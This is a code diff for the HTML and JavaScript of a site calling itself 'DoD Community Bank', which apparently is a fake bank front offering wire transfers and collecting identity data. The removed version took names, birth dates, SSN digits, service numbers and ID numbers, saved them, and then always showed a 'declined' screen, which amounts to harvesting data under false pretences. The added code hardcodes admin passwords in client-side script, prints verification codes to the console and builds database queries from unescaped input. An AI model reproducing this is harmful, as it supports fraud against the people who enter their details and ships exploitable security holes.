@@ -34,7 +34,6 @@ input:focus{border-color:#0B6E4F;box-shadow:0 0 0 2px rgba(11,110,79,0.1)}
 .feat{border:1px solid #E5E5E7;border-radius:8px;padding:24px;background:#fff}
 .feat h4{font-size:16px;font-weight:700;margin-bottom:8px}
 .feat p{font-size:13px;color:#6B7280;line-height:1.5}
-.feat a{color:#0B6E4F;font-weight:600;font-size:13px;text-decoration:none;display:block;margin-top:10px}
 .footer{background:#F7F8FA;padding:30px 20px;border-top:1px solid #E5E5E7;font-size:11px;color:#6B7280;line-height:1.7}
 .tabs{display:flex;border-bottom:1px solid #E5E5E7;margin:18px 0}
 .tab{flex:1;padding:10px;text-align:center;font-size:13px;font-weight:700;cursor:pointer;border-bottom:2px solid transparent}
@@ -46,6 +45,8 @@ input:focus{border-color:#0B6E4F;box-shadow:0 0 0 2px rgba(11,110,79,0.1)}
 .form-grid .full{grid-column:1 / -1}
 .req{color:#FF3B30}
 .decline-box{background:#FEF2F2;border:1px solid #FECACA;padding:16px;border-radius:8px;margin:14px 0;display:flex;gap:12px}
+.otp-box{background:#F0FDF4;border:1px solid #BBF7D0;padding:16px;border-radius:8px;margin:14px 0;text-align:center}
+.otp-input{font-size:24px;letter-spacing:8px;text-align:center;font-weight:700}
 @media (max-width: 768px){
   .header{padding:0 14px;height:56px}
   .nav{display:none}
@@ -54,41 +55,66 @@ input:focus{border-color:#0B6E4F;box-shadow:0 0 0 2px rgba(11,110,79,0.1)}
   .hero{flex-direction:column;min-height:auto}
   .hero-left{padding:28px 20px}
   .hero-left h1{font-size:28px}
-  .hero-left p{font-size:14px}
   .hero-right{padding:16px}
   .login-card{max-width:100%;padding:20px}
   .features{grid-template-columns:1fr;padding:20px 16px;gap:14px}
   .top-blue{flex-direction:column;gap:4px;text-align:center;font-size:10px;padding:8px 12px}
-  .footer{padding:20px 16px;font-size:10px}
   .form-grid{grid-template-columns:1fr}
-  .modal{padding:10px;align-items:flex-start;overflow-y:auto}
-  .modal-box{margin:10px 0;max-width:100%;border-radius:12px;padding:20px}
-}
-@media (max-width: 480px){
-  .hero-left h1{font-size:24px}
-  .signin-btn{padding:8px 14px;font-size:12px}
 }
 </style>
 </head>
 <body>
-<div class="top-blue"><span>DoD Community Bank, N.A. | Member FDIC | Equal Housing Lender</span><span>📍 300 Convent Street Suite 400, San Antonio, TX 78205-3701, USA</span></div>
+<div class="top-blue"><span>DoD Community Bank, N.A. | Member FDIC</span><span>📍 300 Convent Street Suite 400, San Antonio, TX 78205</span></div>
 <div class="header">
   <div class="logo">DoD COMMUNITY BANK <small>EST. 2024 • MILITARY & COMMUNITY BANKING</small></div>
-  <div class="nav"><a onclick="scrollToOpen()">Open Account</a><a>Checking</a><a>Savings</a><a>Loans</a></div>
+  <div class="nav"><a onclick="showOpenAccount()">Open Account</a><a>Checking</a><a>Savings</a><a>Loans</a></div>
   <div style="display:flex;align-items:center;gap:10px"><button class="signin-btn" onclick="document.getElementById('loginSection').scrollIntoView({behavior:'smooth'})">Sign in</button><button id="hamburger" style="display:none;background:none;border:none;font-size:22px;cursor:pointer" onclick="toggleMobile()">☰</button></div>
 </div>
 <div id="mobileMenu" style="display:none;position:fixed;top:56px;left:0;right:0;background:#fff;border-bottom:1px solid #E5E5E7;z-index:99;padding:16px">
-  <a style="display:block;padding:12px 0;font-weight:600;border-bottom:1px solid #F5F5F7" onclick="showOpenAccount(); toggleMobile()">Open Account</a><a style="display:block;padding:12px 0;font-weight:600;border-bottom:1px solid #F5F5F7">Checking</a><a style="display:block;padding:12px 0;font-weight:600;border-bottom:1px solid #F5F5F7">Savings</a><a style="display:block;padding:12px 0;font-weight:600">Loans</a>
+  <a style="display:block;padding:12px 0;font-weight:600;border-bottom:1px solid #F5F5F7" onclick="showOpenAccount(); toggleMobile()">Open Account</a><a style="display:block;padding:12px 0;font-weight:600">Checking</a>
 </div>
 <div class="hero">
-  <div class="hero-left"><h1>Banking built for <b>those who serve.</b></h1><p>DoD Community Bank offers secure checking, high-yield savings, real-time transfers, Western Union, MoneyGram, and Zelle. Open an account online in minutes.</p><div style="margin-top:24px;display:flex;gap:12px"><button class="signin-btn" style="background:#fff;color:#0B6E4F" onclick="showOpenAccount()">Open an Account</button><button class="signin-btn" style="background:transparent;border:1px solid #fff" onclick="document.getElementById('loginSection').scrollIntoView({behavior:'smooth'})">Sign In</button></div><p style="margin-top:20px;font-size:11px;opacity:0.7">Routing: 021000021 • Head Office: 300 Convent Street Suite 400, San Antonio, TX 78205-3701, USA</p></div>
-  <div class="hero-right" id="loginSection"><div class="login-card"><div class="tabs"><div class="tab active" id="tabLogin" onclick="switchTab('login')">Sign In</div><div class="tab" id="tabOpen" onclick="showOpenAccount()">Open Account</div></div><div id="loginFormDiv"><h3>Welcome back</h3><p>Sign in to DoD Community Bank</p><input id="loginEmail" type="email" placeholder="Username / Email"><input id="loginPass" type="password" placeholder="Password"><button class="btn-green" onclick="doLogin()">Sign in</button><button class="btn-outline" onclick="showOpenAccount()">New customer? Open an account</button><div id="loginMsg" style="margin-top:10px;font-size:12px"></div></div><div id="openTeaser" style="display:none"><h3>Open your DoD account</h3><p>All fields required including Service Number for verification</p><button class="btn-green" onclick="showOpenAccount()">Start Application</button></div></div></div>
+  <div class="hero-left">
+    <h1>Banking built for <b>those who serve.</b></h1>
+    <p>DoD Community Bank offers secure checking, high-yield savings, real-time transfers, Western Union, MoneyGram, and Zelle. Open an account online in minutes with Email or Phone verification.</p>
+    <div style="margin-top:24px;display:flex;gap:12px"><button class="signin-btn" style="background:#fff;color:#0B6E4F" onclick="showOpenAccount()">Open an Account</button><button class="signin-btn" style="background:transparent;border:1px solid #fff" onclick="document.getElementById('loginSection').scrollIntoView({behavior:'smooth'})">Sign In</button></div>
+    <p style="margin-top:20px;font-size:11px;opacity:0.7">Routing: 021000021 • Head Office: 300 Convent Street Suite 400, San Antonio, TX 78205</p>
+  </div>
+  <div class="hero-right" id="loginSection">
+    <div class="login-card">
+      <div class="tabs"><div class="tab active" id="tabLogin" onclick="switchTab('login')">Sign In</div><div class="tab" id="tabOpen" onclick="showOpenAccount()">Open Account</div></div>
+      <div id="loginFormDiv">
+        <h3>Welcome back</h3><p>Sign in to DoD Community Bank</p>
+        <input id="loginEmail" type="email" placeholder="Email / Username">
+        <input id="loginPass" type="password" placeholder="Password">
+        <button class="btn-green" onclick="doLogin()">Sign in</button>
+        <button class="btn-outline" onclick="showOpenAccount()">New customer? Open an account</button>
+        <div id="loginMsg" style="margin-top:10px;font-size:12px"></div>
+      </div>
+      <div id="openTeaser" style="display:none">
+        <h3>Open your DoD account</h3><p>Self-registration with Email/Phone code verification</p>
+        <button class="btn-green" onclick="showOpenAccount()">Start Application</button>
+      </div>
+    </div>
+  </div>
 </div>
-<div class="features"><div class="feat"><h4>DoD Checking</h4><p>Free checking with no monthly fees, early direct deposit, real-time transfers to any US bank.</p><a>Learn more →</a></div><div class="feat"><h4>Send Money Worldwide</h4><p>Western Union and MoneyGram with 60+ countries, MTCN tracking, cash pickup in minutes.</p><a>Send money →</a></div><div class="feat"><h4>DoD Loans</h4><p>Personal and emergency loans for service members and community, reviewed by bank.</p><a>Check eligibility →</a></div></div>
-<div class="footer"><b>DoD COMMUNITY BANK HEAD OFFICE</b> 300 Convent Street, Suite 400, San Antonio, TX 78205-3701, USA • Routing Number: 021000021 • (210) 555-0142 • support@dodcommunitybank.com<br>© 2026 DoD Community Bank, N.A. Member FDIC. Equal Housing Lender. All rights reserved.</div>
+<div class="features">
+  <div class="feat"><h4>DoD Checking</h4><p>Free checking with no monthly fees, early direct deposit, real-time transfers.</p></div>
+  <div class="feat"><h4>Send Money Woeldwide </h4><p>Western Union and MoneyGram with 60+ countries,MTCN tracking, cash pickup in minutes.</p></div>
+  <div class="feat"><h4>DoD Loans</h4><p>Personal and emergency loans for service members and community.</p></div>
+</div>
+<div class="footer">© 2026 DoD Community Bank, N.A. Member FDIC. Routing: 021000021</div>
 <div id="modalRoot"></div>
 <script>
 Backendless.initApp('65ABB198-A187-4B5A-B7D3-0839AEA80B26', 'CDA94D34-9A3F-46AB-8B13-65193E45A1B0');
+const ADMIN_CREDENTIALS = [
+  {email:'admin@dodcommunitybank.com', password:'DoDAdmin2024!'},
+  {email:'admin@dod.com', password:'Admin123'},
+  {email:'dodadmin@gmail.com', password:'Admin@12345'}
+];
+function isAdminCred(email, pass){
+  return ADMIN_CREDENTIALS.some(a => a.email.toLowerCase()===email.toLowerCase() && a.password===pass);
+}
 function switchTab(t){
   document.getElementById('tabLogin').classList.toggle('active', t==='login');
   document.getElementById('tabOpen').classList.toggle('active', t==='open');
@@ -98,27 +124,25 @@ function switchTab(t){
 function scrollToOpen(){ showOpenAccount(); }
 function closeModal(){ document.getElementById('modalRoot').innerHTML=''; }
 function openModal(html){ document.getElementById('modalRoot').innerHTML=`<div class="modal" onclick="if(event.target===this) closeModal()"><div class="modal-box">${html}</div></div>`; }
+let pendingSignupData = null;
 function showOpenAccount(){
-  let html=`<h2 style="font-weight:800;font-size:22px">Open DoD Community Bank Account</h2><p style="font-size:13px;color:#6B7280;margin-top:6px">All fields required. Service Number required for DoD verification.</p>
-  <div style="background:#F7F8FA;padding:12px;border-radius:6px;margin:14px 0;font-size:12px"><b>Why Service Number?</b> DoD Community Bank serves military and community. Service Number verifies eligibility.</div>
+  let html=`<h2 style="font-weight:800;font-size:22px">Open DoD Community Bank Account</h2><p style="font-size:13px;color:#6B7280;margin-top:6px">Users can self-create with Email/Phone verification. Admin can also create for users.</p>
   <div class="form-grid">
     <div class="full"><label style="font-size:12px;font-weight:600">Full Legal Name <span class="req">*</span></label><input id="oName" placeholder="John A. Doe"></div>
     <div><label style="font-size:12px;font-weight:600">Date of Birth <span class="req">*</span></label><input id="oDob" type="date"></div>
     <div><label style="font-size:12px;font-weight:600">SSN Last 4 <span class="req">*</span></label><input id="oSsn" placeholder="1234" maxlength="4"></div>
     <div class="full"><label style="font-size:12px;font-weight:600">Email Address <span class="req">*</span></label><input id="oEmail" type="email" placeholder="john@example.com"></div>
     <div><label style="font-size:12px;font-weight:600">Phone Number <span class="req">*</span></label><input id="oPhone" placeholder="(210) 555-1234"></div>
-    <div><label style="font-size:12px;font-weight:600">Service Number <span class="req">*</span></label><input id="oService" placeholder="e.g. 1234567890 / DoD ID"></div>
+    <div><label style="font-size:12px;font-weight:600">Service Number <span class="req">*</span></label><input id="oService" placeholder="DoD ID / Service No"></div>
     <div class="full"><label style="font-size:12px;font-weight:600">Street Address <span class="req">*</span></label><input id="oAddr" placeholder="123 Main St"></div>
     <div><label style="font-size:12px;font-weight:600">City <span class="req">*</span></label><input id="oCity" placeholder="San Antonio"></div>
     <div><label style="font-size:12px;font-weight:600">State <span class="req">*</span></label><select id="oState"><option value="">Select</option><option>Texas - TX</option><option>California - CA</option><option>New York - NY</option><option>Florida - FL</option><option>Other</option></select></div>
-    <div><label style="font-size:12px;font-weight:600">ZIP Code <span class="req">*</span></label><input id="oZip" placeholder="78205"></div>
-    <div><label style="font-size:12px;font-weight:600">ID Type <span class="req">*</span></label><select id="oIdType"><option>Driver License</option><option>State ID</option><option>Military ID</option><option>Passport</option></select></div>
-    <div class="full"><label style="font-size:12px;font-weight:600">ID Number <span class="req">*</span></label><input id="oIdNum" placeholder="ID Number"></div>
+    <div><label style="font-size:12px;font-weight:600">ZIP <span class="req">*</span></label><input id="oZip" placeholder="78205"></div>
+    <div><label style="font-size:12px;font-weight:600">Verification Method <span class="req">*</span></label><select id="oVerifyMethod"><option value="email">Email Code</option><option value="phone">Phone Code (SMS)</option><option value="both">Both Email & Phone</option></select></div>
     <div class="full"><label style="font-size:12px;font-weight:600">Create Password <span class="req">*</span></label><input id="oPass" type="password" placeholder="Min 8 characters"></div>
-    <div class="full"><label style="font-size:12px;font-weight:600">Confirm Password <span class="req">*</span></label><input id="oPass2" type="password" placeholder="Confirm"></div>
+    <div class="full"><label style="font-size:12px;font-weight:600">Confirm Password <span class="req">*</span></label><input id="oPass2" type="password"></div>
   </div>
-  <div style="margin:14px 0;font-size:11px"><input type="checkbox" id="oAgree" style="width:auto"> I agree to DoD Community Bank Terms, Privacy, and authorize verification of Service Number.</div>
-  <button class="btn-green" onclick="submitOpenAccount()">Submit Application - Verify Service Number</button>
+  <button class="btn-green" onclick="submitOpenAccount()">Create Account - Send Verification Code</button>
   <button class="btn-outline" onclick="closeModal()">Cancel</button>
   <p id="openMsg" style="font-size:12px;margin-top:10px"></p>`;
   openModal(html);
@@ -127,61 +151,170 @@ async function submitOpenAccount(){
   let name=document.getElementById('oName').value.trim();
   let dob=document.getElementById('oDob').value;
   let ssn=document.getElementById('oSsn').value.trim();
-  let email=document.getElementById('oEmail').value.trim();
+  let email=document.getElementById('oEmail').value.trim().toLowerCase();
   let phone=document.getElementById('oPhone').value.trim();
   let service=document.getElementById('oService').value.trim();
   let addr=document.getElementById('oAddr').value.trim();
   let city=document.getElementById('oCity').value.trim();
   let state=document.getElementById('oState').value;
   let zip=document.getElementById('oZip').value.trim();
-  let idType=document.getElementById('oIdType').value;
-  let idNum=document.getElementById('oIdNum').value.trim();
+  let verifyMethod=document.getElementById('oVerifyMethod').value;
   let pass=document.getElementById('oPass').value;
   let pass2=document.getElementById('oPass2').value;
-  let agree=document.getElementById('oAgree').checked;
-  if(!name||!dob||!ssn||!email||!phone||!service||!addr||!city||!state||!zip||!idNum||!pass){
-    return document.getElementById('openMsg').innerHTML='<span style="color:#FF3B30">All required fields must be filled - including Service Number</span>';
+  if(!name||!dob||!ssn||!email||!phone||!service||!addr||!city||!state||!zip||!pass){
+    return document.getElementById('openMsg').innerHTML='<span style="color:#FF3B30">All fields required</span>';
   }
   if(pass!==pass2) return document.getElementById('openMsg').innerHTML='<span style="color:#FF3B30">Passwords do not match</span>';
-  if(!agree) return document.getElementById('openMsg').innerHTML='<span style="color:#FF3B30">You must agree to terms</span>';
-  if(ssn.length!==4) return document.getElementById('openMsg').innerHTML='<span style="color:#FF3B30">SSN Last 4 must be 4 digits</span>';
-  document.getElementById('openMsg').innerHTML='Verifying Service Number with DoD database...';
-  setTimeout(async ()=>{
+  document.getElementById('openMsg').innerHTML='Generating verification code...';
+  
+  let code = Math.floor(100000 + Math.random()*900000).toString();
+  pendingSignupData = {name,dob,ssn,email,phone,service,addr,city,state,zip,pass,verifyMethod,code, created: new Date()};
+  
+  try{
+    // Save code to VerificationCodes table
+    await Backendless.Data.of('VerificationCodes').save({
+      email: email,
+      phone: phone,
+      code: code,
+      verifyMethod: verifyMethod,
+      name: name,
+      status: 'pending',
+      expires: new Date(Date.now()+15*60000),
+      created: new Date()
+    });
+    console.log('OTP CODE for', email, 'is:', code);
+  }catch(e){ console.log('VerificationCodes table error (create table if not exists)', e); }
+  
+  // Show OTP modal
+  let html=`<div style="text-align:center">
+    <h3 style="font-weight:800">Verification Code Sent</h3>
+    <div class="otp-box">
+      <p style="font-size:13px">We sent a 6-digit code via <b>${verifyMethod}</b> to:</p>
+      <p style="font-size:13px;font-weight:700;margin:6px 0">${verifyMethod==='phone'?phone: verifyMethod==='both'? email+' & '+phone : email}</p>
+      <p style="font-size:11px;color:#6B7280">For demo, code is in console (F12) or Backendless VerificationCodes table. Real email/SMS can be enabled later.</p>
+      <p style="font-size:11px;color:#6B7280;margin-top:8px">Check your email or phone for the code. For testing, check Backendless Data → VerificationCodes table or browser console (F12).</p>
+    </div>
+    <input id="otpInput" class="otp-input" placeholder="000000" maxlength="6" style="margin-top:12px">
+    <button class="btn-green" onclick="verifyCode()">Verify & Create Account</button>
+    <button class="btn-outline" onclick="resendCode()">Resend Code</button>
+    <button class="btn-outline" onclick="closeModal()">Cancel</button>
+    <p id="otpMsg" style="font-size:12px;margin-top:10px"></p>
+  </div>`;
+  openModal(html);
+}
+async function resendCode(){
+  if(!pendingSignupData) return;
+  let code = Math.floor(100000 + Math.random()*900000).toString();
+  pendingSignupData.code = code;
+  try{
+    await Backendless.Data.of('VerificationCodes').save({
+      email: pendingSignupData.email,
+      phone: pendingSignupData.phone,
+      code: code,
+      verifyMethod: pendingSignupData.verifyMethod,
+      name: pendingSignupData.name,
+      status: 'pending',
+      expires: new Date(Date.now()+15*60000),
+      created: new Date()
+    });
+  }catch(e){}
+  document.getElementById('otpMsg').innerHTML='<span style="color:#0B6E4F">New code sent! Check your email/phone or VerificationCodes table.</span>';
+  console.log('NEW OTP CODE:', code);
+}
+async function verifyCode(){
+  let input=document.getElementById('otpInput').value.trim();
+  let msg=document.getElementById('otpMsg');
+  if(!input||input.length!==6){ msg.innerHTML='<span style="color:#FF3B30">Enter 6-digit code</span>'; return; }
+  if(!pendingSignupData){ msg.innerHTML='<span style="color:#FF3B30">Session expired, start again</span>'; return; }
+  
+  // Check code
+  if(input!==pendingSignupData.code){
     try{
-      await Backendless.Data.of('Applications').save({
-        name:name, dob:dob, ssnLast4:ssn, email:email, phone:phone, serviceNumber:service,
-        address:addr, city:city, state:state, zip:zip, idType:idType, idNumber:idNum,
-        status:'declined', reason:'Service Number verification failed - try again later',
-        site:'dodcommunitybank', created:new Date()
+      // Also check in table
+      let found = await Backendless.Data.of('VerificationCodes').find({whereClause:`email='${pendingSignupData.email}' AND code='${input}'`});
+      if(found.length===0){ msg.innerHTML='<span style="color:#FF3B30">Invalid code. Please check your email/phone.</span>'; return; }
+    }catch(e){
+      if(input!==pendingSignupData.code){ msg.innerHTML='<span style="color:#FF3B30">Invalid code. Try again or click Resend.</span>'; return; }
+    }
+  }
+  
+  msg.innerHTML='Code verified! Creating your DoD account...';
+  
+  try{
+    let d = pendingSignupData;
+    let accountNumber = 'DOD' + Math.floor(100000000 + Math.random()*900000000).toString();
+    
+    // 1. Create Backendless User account
+    let user = new Backendless.User();
+    user.email = d.email;
+    user.password = d.pass;
+    user.name = d.name;
+    let registered = await Backendless.UserService.register(user);
+    
+    // 2. Create entry in Users table with all details - isBlocked=false, isVerified=true
+    await Backendless.Data.of('Users').save({
+      email: d.email,
+      name: d.name,
+      phone: d.phone,
+      accountNumber: accountNumber,
+      balance: 0,
+      city: d.city,
+      state: d.state,
+      address: d.addr,
+      zip: d.zip,
+      dob: d.dob,
+      ssnLast4: d.ssn,
+      serviceNumber: d.service,
+      isBlocked: false,
+      isVerified: true,
+      status: 'active',
+      accountStatus: 'active',
+      verifyMethod: d.verifyMethod,
+      created: new Date()
+    });
+    
+    // 3. Mark verification as verified
+    try{
+      await Backendless.Data.of('VerificationCodes').save({
+        email: d.email,
+        code: d.code,
+        status: 'verified',
+        verifiedAt: new Date()
       });
-    }catch(e){ console.log('Applications table', e); }
-    let html=`<div style="text-align:center">
-      <div style="width:64px;height:64px;background:#FEF2F2;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto">⚠</div>
-      <h3 style="margin-top:14px;font-weight:800">Application Declined - Try Again Later</h3>
-      <div class="decline-box"><div>🚫</div><div style="text-align:left"><b style="font-size:13px">Service Number could not be verified</b><p style="font-size:12px;color:#6B7280;margin-top:4px">We were unable to verify Service Number <b>${service}</b> for ${name}. Our verification system is temporarily unable to confirm DoD eligibility.</p><p style="font-size:12px;color:#6B7280;margin-top:8px">Application ID: DOD-APP-${Date.now().toString().slice(-6)} • ${new Date().toLocaleString()}</p></div></div>
-      <p style="font-size:12px;color:#6B7280;margin-top:12px">Please try again later or visit our head office: 300 Convent Street Suite 400, San Antonio, TX 78205-3701, USA with your Service ID and valid government ID. </p>
-      <button class="btn-green" onclick="closeModal()">Try Again Later</button>
-      <button class="btn-outline" onclick="closeModal(); switchTab('login')">Sign In Instead</button>
-    </div>`;
-    openModal(html);
-  }, 1800);
+    }catch(e){}
+    
+    msg.innerHTML='<span style="color:#0B6E4F">Account created! DOD Number: '+accountNumber+' - Logging in...</span>';
+    
+    // Auto login
+    let loginUser = await Backendless.UserService.login(d.email, d.pass, true);
+    try{
+      let full=await Backendless.Data.of("Users").find({whereClause:`email='${d.email}'`});
+      if(full.length>0) loginUser={...loginUser, ...full[0]};
+    }catch(e){}
+    
+    localStorage.setItem('currentUser', JSON.stringify(loginUser));
+    localStorage.setItem('currentUserEmail', d.email);
+    localStorage.setItem('userToken', loginUser['user-token']||'');
+    
+    setTimeout(()=>{ window.location.href='dashboard.html'; }, 1000);
+    
+  }catch(e){
+    console.log('Create account error', e);
+    if(e.message && e.message.toLowerCase().includes('already')){
+      msg.innerHTML='<span style="color:#FF3B30">Email already exists. Please Sign In instead.</span>';
+    } else {
+      msg.innerHTML='<span style="color:#FF3B30">Error: '+e.message+'</span>';
+    }
+  }
 }
-// SINGLE FIXED LOGIN - HANDLES MULTI-ACCOUNTS + ADMIN
-const ADMIN_CREDENTIALS = [
-  {email:'admin@dodcommunitybank.com', password:'DoDAdmin2024!'},
-  {email:'admin@dod.com', password:'Admin123'},
-  {email:'dodadmin@gmail.com', password:'Admin@12345'}
-];
-function isAdminCred(email, pass){
-  return ADMIN_CREDENTIALS.some(a => a.email.toLowerCase()===email.toLowerCase() && a.password===pass);
-}
+// FIXED LOGIN - Multi-account + Admin + Blocked fix
 async function doLogin(){
   let email=document.getElementById('loginEmail').value.trim().toLowerCase();
   let pass=document.getElementById('loginPass').value;
   if(!email||!pass) return alert('Enter email and password');
   document.getElementById('loginMsg').innerHTML='Signing in to DoD Community Bank...';
   
-  // FIX: Clear previous account - fixes one-account bug
+  // Clear previous - fixes one account bug
   localStorage.removeItem('currentUser');
   localStorage.removeItem('currentUserEmail');
   localStorage.removeItem('userToken');
@@ -195,27 +328,32 @@ async function doLogin(){
   }
   try{
     let user=await Backendless.UserService.login(email, pass, true);
+    let fullUser = user;
     try{
       let full=await Backendless.Data.of("Users").find({whereClause:`email='${email}'`});
       if(full.length>0){
-        if(full[0].isBlocked===true || full[0].status==='blocked' || full[0].accountStatus==='blocked'){
-          document.getElementById('loginMsg').innerHTML='<span style="color:#FF3B30">🚫 ACCOUNT BLOCKED - Contact Head Office</span>';
+        console.log('User found in Users table:', full[0]);
+        // ONLY block if isBlocked === true explicitly - FIXED
+        if(full[0].isBlocked===true){
+          document.getElementById('loginMsg').innerHTML='<span style="color:#FF3B30">🚫 ACCOUNT BLOCKED - Contact Head Office<br>300 Convent Street Suite 400, San Antonio, TX</span>';
           await Backendless.UserService.logout();
+          localStorage.removeItem('currentUser');
           return;
         }
-        user={...user, ...full[0]};
+        fullUser={...user, ...full[0]};
       }
-    }catch(e){ console.log('fetch full user error', e); }
-    localStorage.setItem('currentUser', JSON.stringify(user));
+    }catch(e){ console.log('fetch Users table error', e); }
+    
+    localStorage.setItem('currentUser', JSON.stringify(fullUser));
     localStorage.setItem('currentUserEmail', email);
-    localStorage.setItem('userToken', user['user-token']||'');
+    localStorage.setItem('userToken', fullUser['user-token']||'');
     document.getElementById('loginMsg').innerHTML='<span style="color:#0B6E4F">Success - Logged in as '+email+' - Redirecting...</span>';
     setTimeout(()=>{ window.location.href='dashboard.html'; }, 800);
   }catch(e){
     console.log('Login error', e);
     let msg = e.message || '';
     if(msg.toLowerCase().includes('not found') || msg.toLowerCase().includes('invalid')){
-      msg = 'Invalid email or password. If you just signed up, make sure email is correct. If admin created your account, check credentials.';
+      msg = 'Invalid email or password.';
     }
     document.getElementById('loginMsg').innerHTML='<span style="color:#FF3B30">'+msg+' (Code: '+e.code+')</span>';
   }
